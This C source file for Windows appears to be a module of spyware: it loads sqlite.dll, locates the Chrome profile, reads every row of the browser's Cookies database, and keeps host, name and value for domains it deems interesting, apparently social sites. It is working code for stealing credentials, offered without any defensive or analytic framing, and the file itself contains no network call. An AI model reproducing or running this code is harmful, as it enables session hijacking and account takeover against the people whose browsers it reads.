#include <windows.h>
#define _CRT_SECURE_NO_WARNINGS 1
#include <stdio.h>
#include "..\\common.h"
#include "CookieHandler.h"

// SQLITE Library functions 
typedef int (*sqlite3_open)(const char *, void **);
typedef int (*sqlite3_close)(void *);
typedef int (*sqlite3_exec)(void *, const char *, int (*callback)(void*,int,char**,char**), void *, char **);
static sqlite3_open		social_SQLITE_open = NULL;
static sqlite3_close	social_SQLITE_close = NULL;
static sqlite3_exec		social_SQLITE_exec = NULL;
static HMODULE libsqlsc;
//--------------------

extern int DirectoryExists(WCHAR *path);
extern char *HM_CompletePath(char *file_name, char *buffer);
extern char *GetDosAsciiName(WCHAR *orig_path);
extern char *DeobStringA(char *string);
extern WCHAR *GetCHProfilePath();

int static InitSocialLibs()
{
	char buffer[MAX_PATH];

	if (!(libsqlsc = LoadLibrary(HM_CompletePath("sqlite.dll", buffer)))) 
		return 0;
	
	// sqlite functions
	social_SQLITE_open = (sqlite3_open) GetProcAddress(libsqlsc, "sqlite3_open");
	social_SQLITE_close = (sqlite3_close) GetProcAddress(libsqlsc, "sqlite3_close");
	social_SQLITE_exec = (sqlite3_exec) GetProcAddress(libsqlsc, "sqlite3_exec");

	if (!social_SQLITE_open || !social_SQLITE_close || !social_SQLITE_exec) {
		FreeLibrary(libsqlsc);
		return 0;
	}
	return 1;
}

void static UnInitSocialLibs()
{
	FreeLibrary(libsqlsc);
}

int static parse_sqlite_cookies(void *NotUsed, int argc, char **argv, char **azColName)
{
	char *host = NULL;
	char *name = NULL;
	char *value = NULL;

	for(int i=0; i<argc; i++){
		if(!host && !_stricmp(azColName[i], "host_key"))
			host = _strdup(argv[i]);
		if(!name && !_stricmp(azColName[i], "name"))
			name = _strdup(argv[i]);
		if(!value && !_stricmp(azColName[i], "value"))
			value = _strdup(argv[i]);
	}	

	NormalizeDomainA(host);
	if (host && name && value && IsInterestingDomainA(host))
		AddCookieA(host, name, value);

	SAFE_FREE(host);
	SAFE_FREE(name);
	SAFE_FREE(value);

	return 0;
}

int static DumpSqliteCookies(WCHAR *profilePath, WCHAR *signonFile)
{
	void *db;
	char *ascii_path;
	CHAR sqlPath[MAX_PATH];
	int rc;

	if (social_SQLITE_open == NULL)
		return 0;

	if (!(ascii_path = GetDosAsciiName(profilePath)))
		return 0;

	sprintf_s(sqlPath, MAX_PATH, "%s\\%S", ascii_path, signonFile);
	SAFE_FREE(ascii_path);

	if ((rc = social_SQLITE_open(sqlPath, &db))) 
		return 0;

	social_SQLITE_exec(db, "SELECT * FROM cookies;", parse_sqlite_cookies, NULL, NULL);

	social_SQLITE_close(db);

	return 1;
}

int DumpCHCookies(void)
{
	WCHAR *ProfilePath = NULL; 	//Profile path

	ProfilePath = GetCHProfilePath();

	if (ProfilePath == NULL || !DirectoryExists(ProfilePath)) 
		return 0;
		
	if (InitSocialLibs()) {	
		DumpSqliteCookies(ProfilePath, L"Cookies"); 
		UnInitSocialLibs();
	}

	return 0;
}
